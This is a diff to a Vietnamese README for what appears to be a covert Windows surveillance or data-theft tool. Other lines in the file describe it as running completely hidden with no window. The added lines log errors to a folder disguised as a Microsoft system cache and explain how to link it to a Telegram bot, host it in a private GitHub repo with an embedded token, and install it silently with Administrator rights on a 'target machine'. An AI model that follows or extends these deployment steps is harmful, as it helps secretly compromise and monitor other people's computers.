@@ -64,10 +64,43 @@ main/
 - Chạy hoàn toàn ẩn, không có cửa sổ
 - Repo GitHub: **TLe1** (Private)
 
+## 🔧 Kiểm tra và Debug
+
+### Test kết nối Telegram:
+```bash
+python TEST_TELEGRAM.py
+```
+
+### Kiểm tra trạng thái ứng dụng:
+```bash
+CHECK_STATUS.bat
+```
+
+### Xem log lỗi:
+- `%APPDATA%\Microsoft\Windows\System32Cache\temp\error.log`
+- `%APPDATA%\Microsoft\Windows\System32Cache\temp\telegram_error.log`
+
 ## 📖 Hướng dẫn chi tiết
 
-Xem file `HUONG_DAN_DAY_DU.md` để biết cách:
-- Tạo repo GitHub
-- Upload file lên GitHub
-- Cài đặt trên máy đích
-- Xử lý lỗi
+1. **Tạo Bot Telegram:**
+   - Tìm @BotFather trên Telegram
+   - Gửi `/newbot` và làm theo hướng dẫn
+   - Lưu lại Bot Token
+
+2. **Lấy Chat ID:**
+   - Tìm @userinfobot trên Telegram
+   - Gửi `/start` để lấy Chat ID
+
+3. **Cấu hình:**
+   - Sửa file `config.py`
+   - Điền `TELEGRAM_BOT_TOKEN` và `TELEGRAM_CHAT_ID`
+
+4. **Upload lên GitHub:**
+   - Tạo repo mới trên GitHub
+   - Upload tất cả file (trừ `config.py` - đã có trong `.gitignore`)
+   - Cập nhật `INSTALL.bat` với GitHub token và repo name
+
+5. **Cài đặt trên máy đích:**
+   - Tải `INSTALL.bat` từ GitHub
+   - Chạy với quyền Administrator
+   - Ứng dụng sẽ tự động cài đặt và chạy
